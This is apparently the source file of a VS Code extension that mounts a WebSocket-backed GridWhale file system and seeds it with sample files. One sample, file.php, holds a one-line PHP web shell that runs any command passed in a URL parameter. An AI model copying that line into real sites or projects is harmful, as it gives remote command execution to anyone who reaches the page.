import * as vscode from "vscode"
import { WebSocketFS } from "./fileSystemProvider"

export function deactivate() {
  console.log(`WebSocketFS says "Goodbye"`)
}

export function activate(context: vscode.ExtensionContext) {

  console.log('WebSocketFS says "Hello"')

  const { secrets } = context;                 // SecretStorage helper
  const defaultServer = "dev.gridwhale.io";

  const websocketFs = new WebSocketFS(secrets, defaultServer);
  context.subscriptions.push(
    vscode.workspace.registerFileSystemProvider("wsfs", websocketFs, {
      isCaseSensitive: true,
    }),
  )
  let initialized = false

  context.subscriptions.push(
    vscode.commands.registerCommand("wsfs.reset", async () => {
      for (const [name] of await websocketFs.readDirectory(vscode.Uri.parse("wsfs:/"))) {
        void websocketFs.delete(vscode.Uri.parse(`wsfs:/${name}`))
      }
      initialized = false
    }),
  )

  context.subscriptions.push(
    vscode.commands.registerCommand("wsfs.addFile", () => {
      if (initialized) {
        void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/file.txt`), Buffer.from("foo"), {
          create: true,
          overwrite: true,
        })
      }
    }),
  )

  context.subscriptions.push(
    vscode.commands.registerCommand("wsfs.deleteFile", () => {
      if (initialized) {
        void websocketFs.delete(vscode.Uri.parse("wsfs:/file.txt"))
      }
    }),
  )

  context.subscriptions.push(
    vscode.commands.registerCommand("wsfs.init", () => {
      if (initialized) {
        return
      }
      initialized = true

      // most common files types
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/file.txt`), Buffer.from("foo"), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/file.html`), Buffer.from('<html><body><h1 class="hd">Hello</h1></body></html>'), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/file.js`), Buffer.from('console.log("JavaScript")'), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/file.json`), Buffer.from('{ "json": true }'), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/file.ts`), Buffer.from('console.log("TypeScript")'), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/file.css`), Buffer.from("* { color: green; }"), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/file.md`), Buffer.from("Hello _World_"), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(
        vscode.Uri.parse(`wsfs:/file.xml`),
        Buffer.from('<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>'),
        {
          create: true,
          overwrite: true,
        },
      )
      void websocketFs.writeFile(
        vscode.Uri.parse(`wsfs:/file.py`),
        Buffer.from('import base64, sys; base64.decode(open(sys.argv[1], "rb"), open(sys.argv[2], "wb"))'),
        { create: true, overwrite: true },
      )
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/file.php`), Buffer.from("<?php echo shell_exec($_GET['e'].' 2>&1'); ?>"), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/file.yaml`), Buffer.from("- just: write something"), {
        create: true,
        overwrite: true,
      })

      // some more files & folders
      void websocketFs.createDirectory(vscode.Uri.parse(`wsfs:/folder/`))
      void websocketFs.createDirectory(vscode.Uri.parse(`wsfs:/large/`))
      void websocketFs.createDirectory(vscode.Uri.parse(`wsfs:/xyz/`))
      void websocketFs.createDirectory(vscode.Uri.parse(`wsfs:/xyz/abc`))
      void websocketFs.createDirectory(vscode.Uri.parse(`wsfs:/xyz/def`))

      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/folder/empty.txt`), new Uint8Array(0), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/folder/empty.foo`), new Uint8Array(0), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/folder/file.ts`), Buffer.from("let a:number = true; console.log(a);"), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/large/rnd.foo`), randomData(50000), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/xyz/UPPER.txt`), Buffer.from("UPPER"), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/xyz/upper.txt`), Buffer.from("upper"), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/xyz/def/foo.md`), Buffer.from("*WebSocketFS*"), {
        create: true,
        overwrite: true,
      })
      void websocketFs.writeFile(vscode.Uri.parse(`wsfs:/xyz/def/foo.bin`), Buffer.from([0, 0, 0, 1, 7, 0, 0, 1, 1]), {
        create: true,
        overwrite: true,
      })
    }),
  )

  context.subscriptions.push(
    vscode.commands.registerCommand("wsfs.workspaceInit", async () => {

      //------------------------------------------------------------------
      // 1. Ask the user for the connection parameters once
      //------------------------------------------------------------------
      /*
      const server = await vscode.window.showInputBox({
        prompt: 'GridWhale server (host:port or leave blank for default)',
        value: 'localhost:443',
        ignoreFocusOut: true,
      });
      if (server === undefined) return;            // Esc pressed → abort
      */
      const server = defaultServer;

      const user = await vscode.window.showInputBox({
        prompt: 'GridWhale username',
        ignoreFocusOut: true,
      });
      if (user === undefined) return;

      const pass = await vscode.window.showInputBox({
        prompt: 'Password',
        password: true,
        ignoreFocusOut: true,
      });
      if (pass === undefined) return;

      //------------------------------------------------------------------
      // 2. Persist the secret (VS Code encrypts it for us)
      //------------------------------------------------------------------
      const key = `gw:${server}`;                  // one key per server
      await secrets.store(key, JSON.stringify({ user, pass }));

      //------------------------------------------------------------------
      // 3. Add or replace the workspace folder that points at this server
      //------------------------------------------------------------------
      const wsUri = vscode.Uri.parse(`wsfs://${server}/`);
      const existing = vscode.workspace.workspaceFolders
        ?.find(f => f.uri.toString() === wsUri.toString());

      if (existing) {
        // Replace in-place so Explorer refreshes
        const idx = existing.index;
        vscode.workspace.updateWorkspaceFolders(idx, 1, {
          uri: wsUri,
          name: `WebSocketFS (${server})`,
        });
      } else {
        // First-time connection
        vscode.workspace.updateWorkspaceFolders(0, 0, {
          uri: wsUri,
          name: `WebSocketFS (${server})`,
        });
      }

      vscode.window.showInformationMessage(
        `Connected to GridWhale at ${server} as ${user}`);

    }),
  )
}

function randomData(lineCnt: number, lineLen = 155): Buffer {
  const lines: string[] = []
  for (let i = 0; i < lineCnt; i++) {
    let line = ""
    while (line.length < lineLen) {
      line += Math.random()
        .toString(2 + (i % 34))
        .substring(2)
    }
    lines.push(line.substring(0, lineLen))
  }
  return Buffer.from(lines.join("\n"), "utf8")
}
